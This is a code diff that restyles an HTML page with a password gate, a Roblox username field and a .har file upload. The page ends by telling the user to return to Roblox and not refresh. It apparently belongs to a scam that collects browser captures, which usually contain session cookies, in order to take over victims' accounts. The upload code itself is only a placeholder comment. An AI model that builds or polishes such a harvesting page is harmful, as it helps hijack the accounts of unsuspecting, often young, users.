@@ -26,24 +26,29 @@
       max-width: 400px;
     }
 
-    input[type="password"],
-    input[type="text"],
-    button {
+    .input-group {
       margin-top: 15px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    input[type="password"],
+    input[type="text"] {
       padding: 12px;
       border: none;
       border-radius: 5px;
       font-size: 16px;
       width: 100%;
-    }
-
-    input[type="password"],
-    input[type="text"] {
       background: #2c2c2c;
       color: white;
     }
 
     button {
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
       background-color: #3f51b5;
       color: white;
       cursor: pointer;
@@ -78,9 +83,13 @@
     }
 
     #final-message {
+      background-color: #1b5e20;
       color: #00e676;
       font-weight: bold;
+      padding: 10px;
+      border-radius: 5px;
       margin-top: 20px;
+      display: none;
     }
   </style>
 </head>
@@ -88,8 +97,10 @@
   <div id="container">
     <div id="password-section">
       <h2>Enter password</h2>
-      <input type="password" id="password-input" placeholder="Password"/>
-      <button onclick="checkPassword()">Submit</button>
+      <div class="input-group">
+        <input type="password" id="password-input" placeholder="Password" />
+        <button onclick="checkPassword()">Submit</button>
+      </div>
       <p id="error-message"></p>
     </div>
 
@@ -101,7 +112,7 @@
         <input type="file" id="har-file" accept=".har" hidden />
       </div>
       <button onclick="submitForm()">Submit</button>
-      <p id="final-message"></p>
+      <div id="final-message">✅ Now go back to the Roblox website and DO NOT REFRESH.</div>
     </div>
   </div>
 
@@ -133,30 +144,34 @@
         harInput.files = event.dataTransfer.files;
         dropZone.innerHTML = `<p>Selected: ${file.name}</p>`;
       } else {
-        alert("Please upload a .har file.");
+        alert("Please upload a valid .har file.");
       }
     }
 
     harInput.addEventListener("change", () => {
-      if (harInput.files.length > 0) {
-        dropZone.innerHTML = `<p>Selected: ${harInput.files[0].name}</p>`;
+      const file = harInput.files[0];
+      if (file && file.name.endsWith(".har")) {
+        dropZone.innerHTML = `<p>Selected: ${file.name}</p>`;
+      } else {
+        alert("Only .har files are accepted.");
+        harInput.value = "";
       }
     });
 
     function submitForm() {
       const username = document.getElementById("username").value;
-      const file = document.getElementById("har-file").files[0];
+      const file = harInput.files[0];
       const finalMessage = document.getElementById("final-message");
 
       if (!username || !file) {
-        alert("Please enter a username and select a .har file.");
+        alert("Please enter a Roblox username and upload a .har file.");
         return;
       }
 
-      // Placeholder for actual upload logic
-
-      finalMessage.innerText = "✅ Now go back to the Roblox website and DO NOT REFRESH.";
+      // Placeholder for uploading logic
+      finalMessage.style.display = "block";
     }
   </script>
 </body>
 </html>
+
